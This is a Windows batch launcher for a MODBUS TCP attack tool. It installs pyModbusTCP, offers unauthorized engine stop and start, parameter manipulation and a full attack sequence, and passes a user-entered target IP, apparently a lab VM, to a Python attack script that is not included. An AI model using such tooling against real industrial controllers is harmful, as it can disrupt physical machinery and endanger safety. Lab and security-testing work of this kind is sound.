@echo off
echo ========================================
echo MODBUS TCP Attack Script Launcher
echo ========================================
echo.

REM Check if Python is available
python --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: Python not found in PATH
    echo Please install Python or activate your virtual environment
    pause
    exit /b 1
)

REM Check if required packages are installed
echo Checking required packages...
python -c "import pyModbusTCP" >nul 2>&1
if errorlevel 1 (
    echo ERROR: pyModbusTCP package not found
    echo Installing required packages...
    pip install pyModbusTCP
    if errorlevel 1 (
        echo ERROR: Failed to install pyModbusTCP
        pause
        exit /b 1
    )
)

echo.
echo Available attack options:
echo 1. scan    - Scan for MODBUS service
echo 2. read    - Read current engine state
echo 3. stop     - Unauthorized engine stop
echo 4. start    - Unauthorized engine start
echo 5. params   - Parameter manipulation
echo 6. monitor  - Continuous monitoring
echo 7. full     - Full attack sequence
echo.

set /p TARGET_IP="Enter Linux VM IP address: "
set /p ATTACK_TYPE="Enter attack type (default: full): "

if "%ATTACK_TYPE%"=="" set ATTACK_TYPE=full

echo.
echo ========================================
echo Starting attack...
echo Target: %TARGET_IP%
echo Attack: %ATTACK_TYPE%
echo ========================================
echo.

python host_attack_script.py %TARGET_IP% --attack %ATTACK_TYPE%

echo.
echo ========================================
echo Attack completed
echo ========================================
pause 